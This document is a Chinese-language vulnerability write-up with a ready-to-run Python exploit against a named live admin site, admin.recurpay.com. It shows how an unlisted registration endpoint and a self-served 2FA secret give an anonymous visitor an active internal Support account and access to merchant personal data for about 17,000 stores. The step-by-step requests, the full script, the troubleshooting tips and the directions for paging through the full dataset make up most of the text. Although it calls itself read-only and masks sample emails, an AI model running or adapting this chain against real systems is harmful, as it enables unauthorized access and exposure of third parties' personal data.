# Recurpay admin 未公开注册端点 → 匿名 Support 员工 → 全平台商户 PII

## 1. 适用面与前置

- 目标：`https://admin.recurpay.com`（Recurpay 运营后台，Laravel + Sanctum，Sneat 管理模板）
- 前置：公网可达；**无需任何账号、邀请、Cookie**；本地能算 TOTP（RFC6238，标准库即可）
- 核心反常点：前端 `/register` 返回 200 且是 "We are launching soon 🚀" 占位页（无表单），**但后端 `POST /register` 路由仍然开放**，且没有邮箱验证、邀请码、审批流。前端"关闭注册"只是 UI 层假象。

## 2. 复现步骤（实测路径）

| # | 请求 | 期望回显 / 判据 |
|---|---|---|
| 0 | `GET /sanctum/csrf-cookie` | 204，Set-Cookie `XSRF-TOKEN`、`recurpay_session` |
| 1 | `GET /login`（同一 Cookie jar） | 200，HTML 含 `name="_token" value="…"` |
| 2 | `POST /register`，`application/x-www-form-urlencoded`，`Accept: application/json`，body：`_token` / `name` / `email` / `password` / `password_confirmation` | **201**，`application/json`，body `[]`；Set-Cookie 刷新 `recurpay_session` → 注册即自动登录 |
| 3 | `GET /home`（新会话） | **302** → `location: https://admin.recurpay.com/two-factor/setup` |
| 4 | `GET /two-factor/setup` | 200，HTML 含 `<input type="hidden" name="secret_code" value="<BASE32>">` + 二维码 SVG → **2FA secret 直接下发给注册者** |
| 5 | 本地算 `TOTP(secret)`；`POST /two-factor/setup`：`_token`（取自 setup 页）/ `otp` / `secret_code` | **302** → `location: /stores`，2FA 设置完成并进入后台 |
| 6 | `GET /profiles/<自己的 user_id>` | 200，页面显示 **Status: Active / Role: Support**，邮箱为刚注册的不可达地址 |
| 7 | `GET /merchants` 提取 `<meta name="csrf-token" content="…">`；`POST /merchants/js`：`_token=<meta>&listType=all&draw=0&start=0&length=10`，带 `X-CSRF-TOKEN` + `X-Requested-With: XMLHttpRequest` + `Accept: application/json` | **200 application/json**：`{"draw":0,"recordsTotal":17174,"recordsFiltered":17174,"data":[{user_id,store_id,store_title,store_email,user_name,user_email,user_last_accessed_at,…}]}` → `recordsTotal` 即全平台商户总数，字段即 PII |

阴性对照（必须做，排除"公开接口误报"）：

- 无 Cookie `GET /merchants` → 302 `/login`
- 无 Cookie `POST /merchants/js` → 419 `{"message":"CSRF token mismatch."}`

注册用的邮箱可以是**不可达**地址（实测 `probe…@example.invalid`），说明系统在下发账号前没有任何邮箱所有权校验。角色不是最低权限的匿名访客，而是 `Role=Support` 的内部员工、`Status=Active`——可直接读取全平台商户列表，影响面为整个 SaaS 而非单一租户。

## 3. 一键脚本

依赖：`requests`。脚本只做只读动作（注册、设 2FA、读一页商户），不调用任何写业务接口。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Recurpay admin (admin.recurpay.com, Laravel + Sanctum) 未公开注册端点 =>
匿名创建内部 Support 员工账号 => 读取全平台商户 PII

链条：GET /sanctum/csrf-cookie -> GET /login 取 _token -> POST /register
      -> GET /two-factor/setup 取 secret_code -> 自算 TOTP -> POST 设置 2FA
      -> GET /merchants 取 meta csrf-token -> POST /merchants/js listType=all

只做只读探测：注册一个新账号、设置 2FA、读一页商户列表。不调用任何写业务接口。
依赖：requests（pip install requests）
用法：
  python3 recurpay_admin_open_register_poc.py --base https://admin.recurpay.com \
      --email probe<rand>@example.invalid --password 'Wq7!probe<rand>Aa' --out merchants.json
  # 只验证到 2FA 通过 + 角色确认，不拉商户列表：
  python3 recurpay_admin_open_register_poc.py ... --probe-only
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import random
import re
import struct
import sys
import time

import requests

UA = os.environ.get("ARTEX_UA") or (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)

TOKEN_RE = re.compile(r'name="_token"\s+value="([^"]+)"')
SECRET_RE = re.compile(r'name="secret_code"\s+value="([^"]+)"')
CSRF_META_RE = re.compile(r'name="csrf-token"\s+content="([^"]+)"')
PROFILE_RE = re.compile(r'/profiles/(\d+)')


def totp(secret: str, step: int = 30, digits: int = 6) -> str:
    """RFC6238 TOTP，纯标准库。secret 为 base32（大小写/空格不敏感）。"""
    s = secret.strip().replace(" ", "").upper()
    s += "=" * ((8 - len(s) % 8) % 8)
    key = base64.b32decode(s)
    counter = int(time.time()) // step
    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    off = digest[19] & 0x0F
    code = (struct.unpack(">I", digest[off:off + 4])[0] & 0x7FFFFFFF) % (10 ** digits)
    return "%0*d" % (digits, code)


def log(msg, *a):
    print("[*] " + (msg % a if a else msg), flush=True)


def fail(msg):
    print("[-] " + msg, file=sys.stderr, flush=True)
    sys.exit(2)


def new_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })
    return s


def get_token(html: str, where: str) -> str:
    m = TOKEN_RE.search(html)
    if not m:
        fail("%s 页面未找到 name=_token（页面结构变了或被 WAF 拦截）" % where)
    return m.group(1)


def prime_csrf(s, base):
    r = s.get(base + "/sanctum/csrf-cookie", timeout=20)
    log("GET /sanctum/csrf-cookie -> %s (cookies: %s)", r.status_code,
        ", ".join(s.cookies.keys()) or "none")
    return r


def register(s, base, name, email, password):
    prime_csrf(s, base)
    r = s.get(base + "/login", timeout=20)
    log("GET /login -> %s (%d bytes)", r.status_code, len(r.content))
    token = get_token(r.text, "/login")

    r = s.post(base + "/register",
               data={"_token": token, "name": name, "email": email,
                     "password": password, "password_confirmation": password},
               headers={"Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": base + "/register"},
               timeout=20, allow_redirects=False)
    log("POST /register -> %s %s body=%r", r.status_code,
        r.headers.get("content-type", ""), r.text[:200])
    # 成功判据：201 + application/json + body []，且 Set-Cookie 刷新 recurpay_session
    ok = r.status_code in (200, 201) and r.text.strip() in ("[]", "")
    if not ok:
        hint = ""
        if r.status_code == 419:
            hint = " (419=CSRF 不匹配：_token 与 XSRF-TOKEN Cookie 必须同会话)"
        elif r.status_code == 404:
            hint = " (404=该实例未开放注册路由)"
        fail("注册未成功%s" % hint)
    if "recurpay_session" not in s.cookies:
        fail("注册成功但未拿到 recurpay_session，可能该实例关闭了自动登录")
    log("注册成功且已自动登录（recurpay_session 已下发）")


def pass_2fa(s, base, probe_only):
    r = s.get(base + "/home", timeout=20, allow_redirects=False)
    loc = r.headers.get("location", "")
    log("GET /home -> %s location=%s", r.status_code, loc or "-")
    if r.status_code == 200 and "/two-factor" not in loc:
        log("已不在 2FA 引导态（继续）")
        return None

    r = s.get(base + "/two-factor/setup", timeout=20)
    log("GET /two-factor/setup -> %s (%d bytes)", r.status_code, len(r.content))
    if r.status_code != 200:
        fail("2FA setup 页不可达（%s）" % r.status_code)
    m = SECRET_RE.search(r.text)
    if not m:
        fail("setup 页未下发 secret_code")
    secret = m.group(1)
    log("2FA secret 由页面直接下发：%s（注册者自持，等于 2FA 不是门禁）", secret)

    token = get_token(r.text, "/two-factor/setup")
    otp = totp(secret)
    r = s.post(base + "/two-factor/setup",
               data={"_token": token, "otp": otp, "secret_code": secret},
               headers={"Referer": base + "/two-factor/setup"},
               timeout=20, allow_redirects=False)
    log("POST /two-factor/setup (otp=%s) -> %s location=%s", otp, r.status_code,
        r.headers.get("location", "-"))
    if r.status_code not in (200, 302) or "two-factor" in r.headers.get("location", ""):
        # 若 setup 未生效，检查是否要回到 /two-factor/verify
        fail("2FA 设置失败：检查 otp 时间窗/secret 是否解析正确")
    return secret


def whoami(s, base):
    for path in ("/home", "/stores", "/profiles"):
        r = s.get(base + path, timeout=20, allow_redirects=True)
        log("GET %s -> %s (%d bytes)", path, r.status_code, len(r.content))
        m = PROFILE_RE.search(r.text)
        if m:
            uid = m.group(1)
            p = s.get(base + "/profiles/" + uid, timeout=20)
            body = re.sub(r"\s+", " ", p.text)
            status = re.search(r"Status:\s*</?[^>]*>?\s*([A-Za-z]+)", body)
            role = re.search(r"Role:\s*</?[^>]*>?\s*([A-Za-z]+)", body)
            log("GET /profiles/%s -> %s  Status=%s Role=%s", uid, p.status_code,
                status.group(1) if status else "?", role.group(1) if role else "?")
            return uid
    log("未从页面提取到 /profiles/<id>（有些角色页不渲染该链接，可跳过）")
    return None


def dump_merchants(s, base, out, probe_only):
    r = s.get(base + "/merchants", timeout=30)
    log("GET /merchants -> %s (%d bytes)", r.status_code, len(r.content))
    m = CSRF_META_RE.search(r.text)
    if not m:
        fail("/merchants 页未找到 meta csrf-token")
    token = m.group(1)

    if probe_only:
        log("--probe-only：跳过 /merchants/js 数据拉取")
        return

    r = s.post(base + "/merchants/js",
               data={"_token": token, "listType": "all", "draw": "0",
                     "start": "0", "length": "10"},
               headers={"Accept": "application/json",
                        "X-CSRF-TOKEN": token,
                        "X-Requested-With": "XMLHttpRequest",
                        "Referer": base + "/merchants"},
               timeout=60, allow_redirects=False)
    log("POST /merchants/js listType=all -> %s %s (%d bytes)", r.status_code,
        r.headers.get("content-type", ""), len(r.content))
    if r.status_code != 200 or "json" not in r.headers.get("content-type", ""):
        fail("商户列表未返回 JSON（419=CSRF，302=会话失效）")
    d = r.json()
    total = d.get("recordsTotal")
    rows = d.get("data") or []
    log("recordsTotal=%s recordsFiltered=%s 本页返回=%d 行", total,
        d.get("recordsFiltered"), len(rows))
    if not total:
        fail("recordsTotal 为 0，无法确认全平台数据面")
    if rows:
        log("样本字段：%s", ", ".join(sorted(rows[0].keys())))
        log("样本（脱敏）：user_id=%s store_id=%s store_title=%r store_email=%s",
            rows[0].get("user_id"), rows[0].get("store_id"),
            rows[0].get("store_title"), mask_email(rows[0].get("store_email")))
    with open(out, "w", encoding="utf-8") as f:
        json.dump(d, f, ensure_ascii=False, indent=1)
    log("原始响应已存 %s（含第三方 PII，勿外传）", out)

    # DataTables 全量外带：start 递增、length 取上限。默认 length=10，本脚本不自动全量拉取。
    log("全量外带：把 length 提到 100/500 并循环 start=0,length,2*length… 直到 start>=%s", total)


def mask_email(v):
    if not v or "@" not in v:
        return v or "-"
    u, d = v.split("@", 1)
    return (u[:2] + "***@" + d) if len(u) > 2 else ("*@" + d)


def negative_control(base):
    """无 Cookie 对照，排除“公开接口误报”。"""
    s = new_session()
    r = s.get(base + "/merchants", timeout=20, allow_redirects=False)
    log("[对照] 无 Cookie GET /merchants -> %s location=%s", r.status_code,
        r.headers.get("location", "-"))
    r = s.post(base + "/merchants/js", data={"listType": "all"},
               headers={"Accept": "application/json"}, timeout=20)
    log("[对照] 无 Cookie POST /merchants/js -> %s %s", r.status_code, r.text[:80])
    if r.status_code == 419 or r.status_code == 302:
        log("[对照] 符合预期：数据面确由注册获得的有效会话解锁")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://admin.recurpay.com")
    ap.add_argument("--email", default=None)
    ap.add_argument("--password", default=None)
    ap.add_argument("--name", default=None)
    ap.add_argument("--out", default="merchants.json")
    ap.add_argument("--probe-only", action="store_true")
    a = ap.parse_args()
    base = a.base.rstrip("/")
    rnd = random.randint(10000, 99999)
    email = a.email or ("probe%d@example.invalid" % rnd)
    password = a.password or ("Wq7!probe%dAa" % rnd)
    name = a.name or ("Audit Probe %d" % rnd)

    s = new_session()
    log("目标=%s 注册邮箱=%s", base, email)
    register(s, base, name, email, password)
    pass_2fa(s, base, a.probe_only)
    whoami(s, base)
    dump_merchants(s, base, a.out, a.probe_only)
    negative_control(base)
    log("完成：账号 %s 已可访问内部后台；只读，未调用任何写接口。", email)


if __name__ == "__main__":
    main()
```

## 4. 失败排查

- **419 CSRF token mismatch**：Laravel 校验 `_token` 字段或 `X-XSRF-TOKEN`/`X-CSRF-TOKEN` 头，必须与同一 Cookie jar 里的 `XSRF-TOKEN` 同会话；`/sanctum/csrf-cookie` 与后续请求不能换 session。
- **404 / 405 on /register**：该实例已真正关闭注册路由（与本站点不同实例时不要硬套）。
- **302 → /login**：注册成功但未自动登录，改走 `POST /login`（email/password），若跳 `/two-factor/verify` 则用同一 TOTP secret 过 `POST /two-factor/verify`。
- **/merchants/js 返回 419**：`X-CSRF-TOKEN` 用的是旧页面的 meta，重新 GET `/merchants` 再取。
- **recordsTotal=0 或 data 为空**：账号角色缺少 stores 权限；本链条依赖注册默认角色就是 Support/Active，不同部署可能不同构。
- **2FA otp 校验失败**：确认 secret 为 base32（去掉空格、大写、补齐 padding），并注意服务器时间窗（±30s）。

## 5. 影响与注意

- 影响：匿名 → 内部员工账号 → 全平台商户 PII（店铺名、店铺邮箱、店主姓名/邮箱、store_id、最后访问时间），本次 `recordsTotal=17174`。同一账号还能进入 `/stores`、`/migrations`、`/push-notifications` 等运营页面（本次仅做只读探测）。
- 每次验证都会在对方后台留下一个**真实员工账号**（Role=Support、Active），务必使用 `example.invalid` 邮箱，并在报告中注明账号标识与时间，便于对方清理。
- 全量外带属于高风险动作：先确认 `length` 上限，再小步翻页；第三方 PII 只做计数与脱敏样本，不落库外传。